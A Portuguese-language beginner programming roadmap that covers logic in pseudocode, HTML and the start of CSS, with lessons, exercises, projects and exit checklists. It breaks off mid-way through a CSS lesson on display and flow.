# Caminho da Programação — do zero ao avançado

**Linguagens cobertas:** Lógica → HTML → CSS → JavaScript → Python → C → C++

---

## Como usar este material

Este não é um material para ler de ponta a ponta. É um **roteiro**. Cada módulo tem:

- **Objetivo** — o que você sai sabendo
- **Aulas** — conceito explicado + código comentado
- **Exercícios** — para fazer você mesmo, sem copiar
- **Projeto do módulo** — o que prova que você aprendeu
- **Checklist de saída** — só avance quando marcar todos

**Regra número um:** digite todo código à mão. Copiar e colar não ensina nada. Seus dedos precisam errar o ponto e vírgula para o seu cérebro aprender onde ele vai.

**Regra número dois:** quando travar, tente 20 minutos sozinho antes de procurar a resposta. O travamento é onde o aprendizado acontece.

**Regra número três:** cada módulo tem um projeto. Faça. Um portfólio com 6 projetos vale mais que 40 cursos assistidos.

---

## Por que essa ordem

Você pediu da mais fácil para a mais avançada. A ordem abaixo não é só dificuldade — é dificuldade **acumulada**, onde cada módulo prepara o terreno do próximo.

| # | Módulo | Por que aqui | Dificuldade |
|---|--------|--------------|-------------|
| 0 | Lógica | A base de tudo. Sem isso, toda linguagem parece mágica | ●○○○○ |
| 1 | HTML | Não é programação, é estrutura. Resultado visível em minutos | ●○○○○ |
| 2 | CSS | Ainda não é lógica, mas exige raciocínio espacial | ●●○○○ |
| 3 | JavaScript | Primeira linguagem de verdade, aplicada no que você já construiu | ●●●○○ |
| 4 | Python | Sintaxe limpa. Aqui você aprofunda lógica e algoritmos | ●●●○○ |
| 5 | Java | Tipagem estática e orientação a objetos de verdade. O mercado corporativo | ●●●○○ |
| 6 | C | Tira as rodinhas. Memória, ponteiros, como a máquina funciona | ●●●●○ |
| 7 | C++ | C + orientação a objetos + abstrações pesadas | ●●●●● |
| 8 | Git | Não é linguagem, é a ferramenta que toda vaga exige. Comece no Módulo 1 | ●●○○○ |
| 9 | SQL | Onde os dados moram. Nenhum back-end existe sem isto | ●●●○○ |
| 10 | Segurança | O que separa aplicação publicável de passivo jurídico | ●●●○○ |
| 11 | Deploy | O abismo entre "terminei" e "está no ar" | ●●●○○ |
| 12 | IA | Como funciona por dentro e como construir com ela | ●●●○○ |

**Sobre JavaScript vir antes de Python:** os dois têm dificuldade parecida. Coloquei JS primeiro porque ele dá continuidade ao HTML/CSS — você faz a página que acabou de construir *fazer coisas*, e isso segura a motivação nas primeiras semanas, que é quando a maioria desiste. Se em algum momento o JavaScript te frustrar demais, pode inverter: faça Python primeiro e volte pro JS depois. A lógica é a mesma, só muda o vestido.

**Sobre Java entrar entre Python e C:** Java é o degrau que falta entre as duas. Ele te obriga a declarar tipo, como o C vai obrigar, mas continua limpando a memória por você, como o Python faz — então você paga só metade do preço de cada vez. É também a linguagem com mais vagas de back-end no Brasil, o que torna esta a segunda parada de empregabilidade do caminho.

**Sobre C vir depois de tudo:** muita escola começa por C. Funciona, mas é cruel com iniciante — você passa três semanas lutando com ponteiro sem nunca ter visto um programa seu funcionar. Deixando C para depois, quando você já sabe programar, ele deixa de ser um obstáculo e vira o que realmente é: a explicação de *por que* as outras linguagens funcionam.

---

## Cronograma para 4–7 horas por semana

Com o seu ritmo, o caminho completo leva de **24 a 30 meses**. Parece muito, mas veja onde você já está empregável:

| Fase | Módulos | Tempo | O que você já consegue |
|------|---------|-------|------------------------|
| Fase 1 | 0, 1, 2 + 8 (Git) | ~4 meses | Montar sites estáticos e versionados. Já dá freela pequeno |
| Fase 2 | 3 (JS) | ~4 meses | **Ponto de empregabilidade.** Vaga júnior de front-end |
| Fase 3 | 4, 9 (Python + SQL) | ~5 meses | Back-end, automação, dados. Dobra seu leque de vagas |
| Fase 4 | 5 (Java) | ~3 meses | **Segundo ponto de empregabilidade.** Vaga júnior de back-end |
| Fase 5 | 10, 11 (Segurança/Deploy) | ~3 meses | Entrega sozinho, do código ao ar. Deixa de depender de alguém para publicar |
| Fase 6 | 12 (IA) | ~2 meses | Constrói com IA em vez de só usar o chat |
| Fase 7 | 6, 7 (C/C++) | ~5 meses | Base sólida. Diferencial em entrevista técnica |

Se o objetivo é emprego, **o alvo real é o fim da Fase 2**. Ali você já pode começar a se candidatar enquanto estuda o resto. Não espere terminar tudo para se aplicar — ninguém termina "tudo".

**Como distribuir 5h na semana (sugestão):**

- 3 sessões de 1h em dias de semana → teoria + exercícios curtos
- 1 sessão de 2h no fim de semana → projeto, onde você junta as peças

Sessões curtas e frequentes batem uma maratona de sábado. O cérebro consolida no intervalo.

---

# MÓDULO 0 — Lógica de Programação

> **Dificuldade:** ●○○○○ · **Tempo:** 3 a 4 semanas · **Pré-requisito:** nenhum

**Objetivo:** entender o que é um programa antes de aprender qualquer linguagem. Este módulo é o mais importante do material inteiro. Quem pula ele passa os próximos dois anos decorando sintaxe sem entender nada.

Você vai fazer os exercícios daqui **no papel** e depois em [Portugol Webstudio](https://portugol-webstudio.cubos.io/) (roda no navegador, escreve em português).

---

## Aula 0.1 — O que é programar, de verdade

Programar não é saber uma linguagem. Programar é **quebrar um problema em passos tão pequenos e tão burros que uma máquina consegue seguir**.

O computador não é inteligente. Ele é rápido e obediente. Ele faz exatamente o que você mandou — inclusive a besteira que você mandou sem perceber.

Pense em explicar para alguém como fazer um sanduíche. Você diria "passa manteiga no pão". Um computador responderia: *o que é passar? qual lado do pão? quanto de manteiga? e se não tiver manteiga?*

Programar é ter essa paciência.

**Exercício mental (faça agora, no papel):** escreva o passo a passo de "escovar os dentes" com detalhe suficiente para um robô executar. Você vai descobrir que esqueceu de mandar ele abrir a torneira. Todo mundo esquece. Isso é um *bug*.

---

## Aula 0.2 — Algoritmo

**Algoritmo** é uma sequência finita de passos que resolve um problema.

Três características obrigatórias:

1. **Finito** — tem que terminar
2. **Definido** — cada passo é claro, sem ambiguidade
3. **Eficaz** — resolve o problema de fato

Exemplo — calcular a média de duas notas:

```
INÍCIO
  1. Peça a primeira nota e guarde em NOTA1
  2. Peça a segunda nota e guarde em NOTA2
  3. Calcule MEDIA = (NOTA1 + NOTA2) / 2
  4. Se MEDIA for maior ou igual a 7:
       escreva "Aprovado"
     Senão:
       escreva "Reprovado"
FIM
```

Isso é um algoritmo. Não tem linguagem nenhuma aí — é raciocínio puro. Quando você souber isso, traduzir para Python, C ou JavaScript é só questão de dicionário.

**Pseudocódigo** é escrever algoritmo dessa forma, em português estruturado. Você vai usar isso a vida inteira, mesmo depois de sênior — a gente rabisca o pseudocódigo antes de escrever código de verdade.

---

## Aula 0.3 — Variáveis e tipos

Uma **variável** é uma caixa com nome onde você guarda um valor.

```
idade = 25
```

Leia assim: "a caixa chamada `idade` agora guarda o valor 25".

Três coisas importantes:

- A caixa tem **nome** (`idade`)
- A caixa tem **conteúdo** (`25`)
- O conteúdo pode **mudar** — por isso "variável"

```
idade = 25
idade = 26     // agora a caixa guarda 26. O 25 sumiu.
```

### Tipos de dado

O tipo diz que espécie de coisa cabe na caixa. Os quatro básicos:

| Tipo | O que guarda | Exemplo |
|------|--------------|---------|
| **Inteiro** (int) | Números sem vírgula | `42`, `-7`, `0` |
| **Real / Flutuante** (float) | Números com vírgula | `3.14`, `-0.5` |
| **Texto** (string) | Sequência de caracteres | `"Maria"`, `"a"`, `"123"` |
| **Booleano** (bool) | Só verdadeiro ou falso | `true`, `false` |

**Atenção nessa pegadinha:** `123` (inteiro) é diferente de `"123"` (texto). O primeiro você soma, o segundo você não. `2 + 2` dá 4. `"2" + "2"` pode dar `"22"`. Isso vai te morder em JavaScript, prepare-se.

### Nomes de variáveis

Regra prática: o nome tem que dizer o que a caixa guarda.

```
x = 1500          // ruim. x o quê?
s = 1500          // ruim
salarioBruto = 1500   // bom
```

Você lê código muito mais do que escreve. Nome bom é presente pro seu eu do mês que vem.

---

## Aula 0.4 — Operadores

### Aritméticos

| Operador | Faz | Exemplo | Resultado |
|----------|-----|---------|-----------|
| `+` | Soma | `7 + 3` | `10` |
| `-` | Subtrai | `7 - 3` | `4` |
| `*` | Multiplica | `7 * 3` | `21` |
| `/` | Divide | `7 / 2` | `3.5` |
| `%` | Resto da divisão | `7 % 2` | `1` |

O `%` (**módulo**) parece inútil e é um dos mais usados. Ele responde "sobrou quanto?".

Uso clássico — descobrir se um número é par:

```
se numero % 2 == 0 então é par
```

Porque todo número par dividido por 2 tem resto zero. Guarde esse truque.

### Comparação

Sempre devolvem verdadeiro ou falso:

| Operador | Significa |
|----------|-----------|
| `==` | É igual a |
| `!=` | É diferente de |
| `>` | Maior que |
| `<` | Menor que |
| `>=` | Maior ou igual |
| `<=` | Menor ou igual |

**O erro mais comum de todo iniciante:** confundir `=` com `==`.

- `=` é **atribuição**: "coloque esse valor na caixa"
- `==` é **comparação**: "esses dois valores são iguais?"

```
idade = 18     // coloca 18 na caixa idade
idade == 18    // pergunta: idade é 18? devolve verdadeiro ou falso
```

### Lógicos

Combinam condições:

| Operador | Nome | Verdadeiro quando |
|----------|------|-------------------|
| `E` (`&&`) | AND | **As duas** condições são verdadeiras |
| `OU` (`\|\|`) | OR | **Pelo menos uma** é verdadeira |
| `NÃO` (`!`) | NOT | Inverte o valor |

```
idade >= 18 E temCarteira == true    // só entra se as duas baterem
diaSemana == "sábado" OU diaSemana == "domingo"   // basta uma
```

Tabela verdade — decore essa, ela nunca muda em nenhuma linguagem:

| A | B | A E B | A OU B |
|---|---|-------|--------|
| V | V | V | V |
| V | F | F | V |
| F | V | F | V |
| F | F | F | F |

---

## Aula 0.5 — Condicionais (o programa toma decisão)

Até agora o programa era uma linha reta. Condicional é a primeira **bifurcação**.

```
SE (condição) ENTÃO
   faz isso
SENÃO
   faz aquilo
FIM SE
```

Exemplo:

```
SE (saldo >= valorCompra) ENTÃO
   ESCREVA "Compra aprovada"
   saldo = saldo - valorCompra
SENÃO
   ESCREVA "Saldo insuficiente"
FIM SE
```

### Condicionais encadeadas

Quando há mais de dois caminhos:

```
SE (nota >= 9) ENTÃO
   ESCREVA "A"
SENÃO SE (nota >= 7) ENTÃO
   ESCREVA "B"
SENÃO SE (nota >= 5) ENTÃO
   ESCREVA "C"
SENÃO
   ESCREVA "D"
FIM SE
```

**Ponto sutil que quase ninguém explica:** a ordem importa. O programa testa de cima para baixo e **para no primeiro que der verdadeiro**. Se você inverter e colocar `nota >= 5` primeiro, um aluno com 9 receberia "C", porque 9 também é maior que 5 e o teste pararia ali.

---

## Aula 0.6 — Laços de repetição

Laço é o que faz o computador valer a pena. Ele repete algo 10 mil vezes sem reclamar.

### ENQUANTO (while) — repete enquanto a condição for verdadeira

```
contador = 1
ENQUANTO (contador <= 5) FAÇA
   ESCREVA contador
   contador = contador + 1
FIM ENQUANTO
```

Saída: 1, 2, 3, 4, 5

Repare nas três partes obrigatórias de todo laço:

1. **Inicialização** — `contador = 1`
2. **Condição de parada** — `contador <= 5`
3. **Atualização** — `contador = contador + 1`

**Se você esquecer a atualização, o programa nunca para.** Isso é o *loop infinito*, e você vai criar uns cinquenta na sua vida. Faz parte.

### PARA (for) — quando você sabe quantas vezes vai repetir

```
PARA i DE 1 ATÉ 5 FAÇA
   ESCREVA i
FIM PARA
```

Saída: 1, 2, 3, 4, 5 — exatamente a mesma do ENQUANTO acima.

As três partes continuam existindo, espremidas na primeira linha:

| Parte | No ENQUANTO | No PARA |
|-------|-------------|---------|
| Inicialização | `contador = 1` | `DE 1` |
| Condição de parada | `contador <= 5` | `ATÉ 5` |
| Atualização | `contador = contador + 1` | não aparece — o PARA soma 1 sozinho |

**Não procure a atualização: ela é automática.** E é exatamente aí que está a vantagem — como o PARA incrementa por conta própria, ele **não tem como virar loop infinito**. O erro que o ENQUANTO deixa você cometer, o PARA não deixa.

O preço é a rigidez: o PARA anda de 1 em 1, do início ao fim, e pronto. Quando o passo depende de algo que muda durante a execução, só o ENQUANTO resolve.

**Quando usar cada um:**

- Sabe o número de repetições? → **PARA**
- Depende de uma condição que pode mudar? → **ENQUANTO**

"Imprima os 100 primeiros números" → PARA.
"Peça a senha até o usuário acertar" → ENQUANTO.

---

## Aula 0.7 — Vetores (listas)

Uma variável guarda um valor. Um **vetor** guarda vários, numerados.

```
notas = [7.5, 8.0, 6.5, 9.0]
```

Você acessa pela **posição** (chamada índice):

```
notas[0]  →  7.5
notas[1]  →  8.0
notas[3]  →  9.0
```

**A contagem começa no ZERO.** Não em 1. Isso parece arbitrário e vai te confundir por umas duas semanas. Motivo histórico: o índice representa "quantas casas andar a partir do início". O primeiro elemento já está no início, então anda zero casas.

Consequência prática: um vetor de 4 elementos tem índices de **0 a 3**. Pedir `notas[4]` é erro. Esse erro tem nome — *index out of bounds* — e você vai ver muito.

### Percorrendo um vetor

Combinação de vetor + laço. É aqui que a programação começa a ficar poderosa:

```
soma = 0
PARA i DE 0 ATÉ 3 FAÇA
   soma = soma + notas[i]
FIM PARA
media = soma / 4
```

Guarde esse padrão. Ele é a base de 80% do código que você vai escrever: **percorrer uma coleção fazendo algo com cada item**.

---

## Aula 0.8 — Funções

Função é um pedaço de código com nome, que você escreve uma vez e usa quantas vezes quiser.

```
FUNÇÃO calcularMedia(nota1, nota2)
   media = (nota1 + nota2) / 2
   RETORNE media
FIM FUNÇÃO
```

Usando:

```
resultado = calcularMedia(8, 6)    // resultado vale 7
outro = calcularMedia(10, 5)       // outro vale 7.5
```

Três conceitos aqui:

- **Parâmetros** (`nota1`, `nota2`) — as caixas de entrada
- **Corpo** — o que a função faz
- **Retorno** — o que ela devolve para quem chamou

### Por que funções importam mais do que parece

1. **Não repetir código.** Se a regra da média mudar, você corrige em um lugar só.
2. **Nomear ideias.** `calcularMedia(8, 6)` se lê melhor que `(8 + 6) / 2` no meio de 300 linhas.
3. **Dividir o problema.** Um programa grande é um monte de funções pequenas conversando.

Regra de bolso: **uma função deve fazer uma coisa só.** Se você precisa usar "e" para explicar o que ela faz ("ela calcula a média *e* salva no banco *e* manda email"), são três funções.

---

## Aula 0.9 — Teste de mesa e depuração

**Teste de mesa** é executar o código na mão, no papel, simulando o computador. Parece coisa de dinossauro. É a habilidade que mais separa quem programa de quem chuta.

Pegue este código:

```
x = 3
y = 5
ENQUANTO (x < y) FAÇA
   x = x + 2
   ESCREVA x
FIM ENQUANTO
```

Monte a tabela:

| Passo | x | y | x < y? | Saída |
|-------|---|---|--------|-------|
| início | 3 | 5 | — | — |
| volta 1 | 3 | 5 | V | x vira 5, escreve 5 |
| volta 2 | 5 | 5 | F | sai do laço |

Saída final: `5`

Faça isso sempre que um código não fizer o que você esperava. Em 9 de 10 vezes você acha o erro sem precisar de nada além de papel.

### Os 4 tipos de erro

| Tipo | O que é | Exemplo |
|------|---------|---------|
| **Sintaxe** | Escreveu errado | Esqueceu o `;` ou o fechamento de parêntese |
| **Lógica** | Roda, mas faz a coisa errada | Somou quando devia multiplicar |
| **Execução** | Quebra no meio | Divisão por zero, índice fora do vetor |
| **Semântico** | Faz certo, resolve o problema errado | Você entendeu mal o que pediram |

O de **lógica** é o pior, porque o computador não avisa. O programa roda lindamente e entrega um número errado. Só o teste de mesa pega esse.

---

## Exercícios do Módulo 0

Faça em pseudocódigo (papel) e depois no Portugol. Do 1 ao 8 é o mínimo; do 9 ao 12 é o que separa.

1. Leia dois números e mostre a soma, subtração, produto e divisão.
2. Leia a idade e diga se a pessoa é maior de idade.
3. Leia três notas e diga se o aluno foi aprovado (média ≥ 7).
4. Leia um número e diga se é par ou ímpar.
5. Mostre a tabuada de um número lido (use laço).
6. Leia 10 números e mostre a soma e a média.
7. Leia 10 números e mostre qual é o maior e qual é o menor.
8. Peça uma senha até o usuário digitar "1234". Conte as tentativas.
9. Calcule o fatorial de um número (5! = 5×4×3×2×1 = 120).
10. Mostre os 10 primeiros números da sequência de Fibonacci (0, 1, 1, 2, 3, 5, 8...).
11. Leia um número e diga se é primo (só divisível por 1 e por ele mesmo).
12. Leia um vetor de 10 nomes e ordene em ordem alfabética. Faça sem usar função pronta de ordenação — o objetivo é você inventar o algoritmo.

> **O exercício 12 vai doer.** É proposital. Se você conseguir fazer, mesmo que feio e lento, você já pensa como programador.

---

## Checklist de saída do Módulo 0

Só avance para o HTML quando conseguir marcar todos sem consultar nada:

- [ ] Explico a diferença entre `=` e `==` para outra pessoa
- [ ] Sei quando usar `PARA` e quando usar `ENQUANTO`
- [ ] Sei por que vetor começa no índice 0
- [ ] Sei o que é loop infinito e como evitar
- [ ] Escrevo uma função com parâmetro e retorno sem olhar exemplo
- [ ] Faço teste de mesa de um laço com 3 variáveis
- [ ] Resolvi do exercício 1 ao 11
- [ ] Tentei o 12 por pelo menos uma hora

---

# MÓDULO 1 — HTML

> **Dificuldade:** ●○○○○ · **Tempo:** 3 semanas · **Pré-requisito:** Módulo 0

**Objetivo:** estruturar qualquer página web com HTML semântico e acessível.

**Aviso importante:** HTML **não é uma linguagem de programação**. É uma linguagem de *marcação* — ela descreve estrutura, não dá ordens. Não tem lógica, não tem condicional, não tem laço. Por isso é o primeiro módulo: você tem resultado visível em 20 minutos, e isso é combustível.

**Ferramentas:** instale o [VS Code](https://code.visualstudio.com/) e a extensão *Live Server*. Só isso.

---

## Nível Básico

### Aula 1.1 — Como um documento HTML é montado

```html
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minha primeira página</title>
</head>
<body>
    <h1>Olá, mundo</h1>
    <p>Esse é meu primeiro parágrafo.</p>
</body>
</html>
```

Linha por linha:

- `<!DOCTYPE html>` — avisa ao navegador que é HTML5
- `<html lang="pt-BR">` — raiz do documento. O `lang` importa para leitores de tela e para o Google
- `<head>` — informações **sobre** a página. Não aparece na tela
- `<meta charset="UTF-8">` — sem isso, acentos viram `Ã§`. Nunca esqueça
- `<meta name="viewport">` — faz a página funcionar no celular
- `<body>` — o conteúdo visível

### Aula 1.2 — Anatomia de uma tag

```html
<a href="https://exemplo.com" target="_blank">Clique aqui</a>
 │   │                                        │          │
 │   └─ atributo (href) e seu valor           │          └─ tag de fechamento
 └─ tag de abertura                           └─ conteúdo
```

Algumas tags não têm conteúdo nem fechamento — são **vazias**:

```html
<img src="foto.jpg" alt="Descrição da foto">
<br>
<hr>
<input type="text">
```

### Aula 1.3 — Tags essenciais

**Texto:**

```html
<h1>Título principal — só um por página</h1>
<h2>Subtítulo</h2>
<h3>Sub-subtítulo</h3>

<p>Um parágrafo de texto.</p>
<strong>Importante</strong> — negrito com significado
<em>Ênfase</em> — itálico com significado
<br> quebra de linha
```

Hierarquia de títulos **não é sobre tamanho de fonte**. É sobre estrutura. Não use `<h3>` porque achou o `<h2>` grande — use CSS para isso. Pular níveis quebra a acessibilidade.

**Listas:**

```html
<!-- Lista não ordenada (bolinhas) -->
<ul>
    <li>Café</li>
    <li>Pão</li>
</ul>

<!-- Lista ordenada (números) -->
<ol>
    <li>Acorde</li>
    <li>Escove os dentes</li>
</ol>
```

**Links e imagens:**

```html
<a href="pagina2.html">Link interno</a>
<a href="https://google.com" target="_blank" rel="noopener">Link externo</a>
<a href="#secao">Link para uma âncora na mesma página</a>
<a href="mailto:teste@email.com">Enviar email</a>

<img src="imagens/gato.jpg" alt="Gato laranja dormindo no sofá">
```

O `alt` **não é opcional**. Ele é lido por quem usa leitor de tela e aparece quando a imagem não carrega. Descreva o que a imagem mostra, não escreva "imagem de gato".

**Tabelas:**

```html
<table>
    <thead>
        <tr>
            <th>Produto</th>
            <th>Preço</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>Café</td>
            <td>R$ 18,00</td>
        </tr>
    </tbody>
</table>
```

Tabela é para **dados tabulares**. Nunca use tabela para fazer layout — isso era comum em 2005 e hoje é erro grave.

---

## Nível Intermediário

### Aula 1.4 — HTML semântico

Este é o conceito que separa quem "sabe HTML" de quem sabe HTML.

Compare:

```html
<!-- Ruim: tudo é div -->
<div class="topo">
    <div class="menu">...</div>
</div>
<div class="conteudo">
    <div class="artigo">...</div>
</div>
<div class="rodape">...</div>
```

```html
<!-- Bom: tags que dizem o que a coisa é -->
<header>
    <nav>...</nav>
</header>
<main>
    <article>...</article>
</main>
<footer>...</footer>
```

Visualmente idêntico. Mas o segundo é entendido por leitores de tela, pelo Google e pelo próximo programador que abrir seu código.

| Tag | Para quê |
|-----|----------|
| `<header>` | Cabeçalho da página ou de uma seção |
| `<nav>` | Bloco de navegação (menu) |
| `<main>` | Conteúdo principal. Só um por página |
| `<section>` | Seção temática, geralmente com título |
| `<article>` | Conteúdo independente (post, notícia, card de produto) |
| `<aside>` | Conteúdo lateral, secundário |
| `<footer>` | Rodapé |
| `<figure>` / `<figcaption>` | Imagem com legenda |
| `<div>` | Só quando nenhuma das acima serve |

**Regra:** `<div>` é o último recurso, não o primeiro.

### Aula 1.5 — Formulários

Formulário é onde o HTML encosta na programação de verdade — é por aqui que os dados entram.

```html
<form action="/enviar" method="POST">

    <label for="nome">Nome completo</label>
    <input type="text" id="nome" name="nome" required placeholder="Maria Silva">

    <label for="email">E-mail</label>
    <input type="email" id="email" name="email" required>

    <label for="idade">Idade</label>
    <input type="number" id="idade" name="idade" min="0" max="120">

    <label for="senha">Senha</label>
    <input type="password" id="senha" name="senha" minlength="8">

    <label for="estado">Estado</label>
    <select id="estado" name="estado">
        <option value="ce">Ceará</option>
        <option value="rn">Rio Grande do Norte</option>
    </select>

    <label for="mensagem">Mensagem</label>
    <textarea id="mensagem" name="mensagem" rows="5"></textarea>

    <input type="checkbox" id="aceito" name="aceito">
    <label for="aceito">Aceito os termos</label>

    <button type="submit">Enviar</button>
</form>
```

Pontos que caem em entrevista:

- **`label` com `for` apontando pro `id` do campo.** Isso faz clicar no texto focar o campo, e é obrigatório para acessibilidade.
- **`name`** é o que vai pro servidor. Sem `name`, o campo não é enviado.
- **`id`** é para o `label` e para o JavaScript encontrar o campo.
- **`required`, `min`, `max`, `minlength`** dão validação de graça, sem uma linha de JS.
- **`type`** correto muda o teclado no celular. `type="email"` abre teclado com `@`.

### Aula 1.6 — Caminhos de arquivo

Erro que trava todo iniciante: a imagem não aparece.

```
meu-site/
├── index.html
├── sobre.html
├── css/
│   └── estilo.css
└── imagens/
    └── logo.png
```

De dentro do `index.html`:

```html
<img src="imagens/logo.png">        <!-- desce uma pasta -->
<link href="css/estilo.css">        <!-- desce uma pasta -->
```

Se um arquivo estivesse dentro de `css/` e quisesse acessar `imagens/`:

```html
<img src="../imagens/logo.png">     <!-- ../ sobe uma pasta -->
```

`../` sobe. `/` no começo significa raiz do site. Sem barra no começo, é relativo a onde você está.

---

## Nível Avançado

### Aula 1.7 — Acessibilidade (a11y)

Não é enfeite. É requisito legal em muitos contextos e é diferencial em entrevista.

```html
<!-- Landmarks ajudam a navegar por leitor de tela -->
<nav aria-label="Menu principal">...</nav>

<!-- Descrever um botão que só tem ícone -->
<button aria-label="Fechar modal">×</button>

<!-- Avisar que algo mudou dinamicamente -->
<div role="alert" aria-live="polite">Item adicionado ao carrinho</div>

<!-- Esconder decoração de leitores de tela -->
<span aria-hidden="true">🎉</span>
```

Teste rápido: navegue seu site inteiro **só com Tab e Enter**, sem mouse. Se você não consegue chegar em algum lugar, um usuário de teclado também não consegue.

### Aula 1.8 — SEO básico e metadados

```html
<head>
    <title>Bolos Artesanais | Confeitaria Silva</title>
    <meta name="description" content="Bolos sob encomenda em Fortaleza. Entrega em 24h.">

    <!-- Como aparece quando compartilhado no WhatsApp/Facebook -->
    <meta property="og:title" content="Bolos Artesanais">
    <meta property="og:description" content="Bolos sob encomenda em Fortaleza.">
    <meta property="og:image" content="https://site.com/capa.jpg">
    <meta property="og:url" content="https://site.com">
</head>
```

### Aula 1.9 — Mídia e recursos modernos

```html
<!-- Vídeo -->
<video controls width="600" poster="capa.jpg">
    <source src="video.mp4" type="video/mp4">
    Seu navegador não suporta vídeo.
</video>

<!-- Imagem responsiva: navegador escolhe o tamanho certo -->
<picture>
    <source media="(max-width: 600px)" srcset="foto-pequena.jpg">
    <img src="foto-grande.jpg" alt="Descrição">
</picture>

<!-- Acordeão nativo, sem JavaScript -->
<details>
    <summary>Perguntas frequentes</summary>
    <p>Resposta aqui.</p>
</details>
```

---

## Projeto do Módulo 1

**Currículo online em HTML puro, sem nada de CSS.**

Vai ficar feio. É de propósito — o objetivo é estrutura, não beleza.

Requisitos:
- `header` com seu nome e área de atuação
- `nav` com links âncora para as seções
- `main` com `section` para: sobre, formação, experiência, habilidades
- Lista de habilidades com `<ul>`
- Tabela com histórico de formação
- `form` de contato com nome, email, mensagem e envio
- `footer` com links para GitHub e LinkedIn
- Zero `<div>`. Se você precisou de uma, provavelmente existe uma tag semântica melhor

**Critério de aprovação:** abra o site e navegue só com Tab. Tudo alcançável, na ordem certa.

---

## Checklist de saída do Módulo 1

- [ ] Escrevo a estrutura base de um HTML de memória
- [ ] Sei a diferença entre `<section>`, `<article>` e `<div>`
- [ ] Sei por que `alt` e `label for` existem
- [ ] Sei a diferença entre `id` e `name` em formulário
- [ ] Sei usar `../` em caminhos de arquivo
- [ ] Meu currículo passa no teste de navegação por teclado

---

# MÓDULO 2 — CSS

> **Dificuldade:** ●●○○○ · **Tempo:** 5 a 6 semanas · **Pré-requisito:** Módulo 1

**Objetivo:** transformar HTML cru em interface, com layout responsivo funcionando de celular a desktop.

CSS tem fama de fácil e é onde mais gente empaca. O motivo: ele não é difícil de escrever, é difícil de **prever**. Você muda uma linha e três elementos do outro lado da tela se mexem. A cura é entender os quatro sistemas por baixo: cascata, box model, fluxo e contexto de empilhamento.

---

## Nível Básico

### Aula 2.1 — Sintaxe e como conectar

```css
seletor {
    propriedade: valor;
}

h1 {
    color: darkblue;
    font-size: 32px;
}
```

Conectando ao HTML (sempre use a terceira forma):

```html
<!-- 1. Inline: evite. Impossível de manter -->
<p style="color: red;">Texto</p>

<!-- 2. Interno: só para teste rápido -->
<style>
    p { color: red; }
</style>

<!-- 3. Externo: sempre use esse -->
<link rel="stylesheet" href="css/estilo.css">
```

### Aula 2.2 — Seletores

```css
/* Por tag */
p { }

/* Por classe — o seu pão de cada dia */
.destaque { }

/* Por id — use pouco, é rígido demais */
#cabecalho { }

/* Descendente: todo <a> dentro de <nav> */
nav a { }

/* Filho direto: só <li> filho imediato de <ul> */
ul > li { }

/* Múltiplos seletores */
h1, h2, h3 { }

/* Por atributo */
input[type="text"] { }

/* Pseudo-classes: estados */
a:hover { }          /* mouse em cima */
input:focus { }      /* campo focado */
li:first-child { }   /* primeiro filho */
li:nth-child(2n) { } /* pares */

/* Pseudo-elementos: partes que não existem no HTML */
p::first-line { }
.card::before { content: "→"; }
```

### Aula 2.3 — Box Model (o conceito mais importante do CSS)

Todo elemento na tela é uma caixa com quatro camadas:

```
┌─────────────── margin (espaço FORA) ──────────────┐
│  ┌──────────── border (a borda) ────────────────┐ │
│  │  ┌───────── padding (espaço DENTRO) ───────┐ │ │
│  │  │                                          │ │ │
│  │  │            CONTENT (conteúdo)            │ │ │
│  │  │                                          │ │ │
│  │  └──────────────────────────────────────────┘ │ │
│  └────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────┘
```

- **margin** — empurra os outros elementos para longe
- **border** — a linha da caixa
- **padding** — afasta o conteúdo da borda, por dentro
- **content** — o texto ou imagem

```css
.caixa {
    width: 300px;
    padding: 20px;
    border: 5px solid black;
    margin: 10px;
}
```

**A pegadinha clássica:** essa caixa não ocupa 300px. Ela ocupa `300 + 20 + 20 + 5 + 5 = 350px`. Porque `width` conta só o conteúdo.

A cura, que você vai colocar no topo de todo projeto pelo resto da vida:

```css
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}
```

Com `border-box`, o `width: 300px` passa a incluir padding e border. A caixa ocupa 300px de verdade. Isso deveria ser o padrão da web — não é por motivo histórico.

### Aula 2.4 — Cores, unidades e tipografia

```css
/* Cores */
color: red;
color: #FF5733;
color: rgb(255, 87, 51);
color: rgba(255, 87, 51, 0.5);   /* com transparência */
color: hsl(9, 100%, 60%);        /* matiz, saturação, luminosidade */
```

**Unidades — e quando usar cada uma:**

| Unidade | O que é | Use para |
|---------|---------|----------|
| `px` | Pixel fixo | Bordas, sombras |
| `%` | Relativo ao pai | Larguras |
| `rem` | Relativo à raiz (padrão 16px) | **Fontes e espaçamentos** |
| `em` | Relativo ao pai | Espaço interno de componente |
| `vw` / `vh` | 1% da largura/altura da tela | Seções de tela cheia |
| `fr` | Fração do espaço livre (grid) | Colunas de grid |

Prefira `rem` para fonte. Se o usuário aumentar a fonte padrão do navegador (gente com baixa visão faz isso), `rem` acompanha e `px` não.

```css
body {
    font-family: 'Inter', -apple-system, sans-serif;
    font-size: 1rem;
    line-height: 1.6;   /* sem unidade: multiplica o font-size. Use assim */
    font-weight: 400;
}
```

`line-height: 1.6` sem unidade é uma das melhorias mais baratas de legibilidade que existe.

---

## Nível Intermediário

### Aula 2.5 — A Cascata e a Especificidade

Por que seu CSS "não funciona"? Quase sempre é isso.

Quando duas regras brigam pelo mesmo elemento, vence a de maior **especificidade**:

| Tipo de seletor | Peso |
|-----------------|------|
| Inline (`style=""`) | 1000 |
| `#id` | 100 |
| `.classe`, `:hover`, `[atributo]` | 10 |
| `tag`, `::before` | 1 |

```css
p { color: blue; }                    /* peso 1 */
.texto { color: green; }              /* peso 10 — vence */
#principal .texto { color: red; }     /* peso 110 — vence de todos */
```

Empate? Vence a que vier **por último** no arquivo.

Existe o `!important`, que ignora tudo:

```css
p { color: purple !important; }
```

**Não use.** Sério. Ele resolve seu problema hoje e cria três amanhã, porque a única forma de vencer um `!important` é outro `!important`. Se você sentiu que precisa dele, seu CSS está mal organizado — refatore em vez de tapar.

### Aula 2.6 — Display e fluxo

```css
display: block;         /* ocupa a linha toda. div, p, h1 */
display: inline;        /* fica na linha. span, a. Ignora width/height */
display: inline-block;  /* fica na linha, mas aceita width/height */
display: none;          /* some completamente, não ocupa espaço */
display: flex;          /* container flexível */
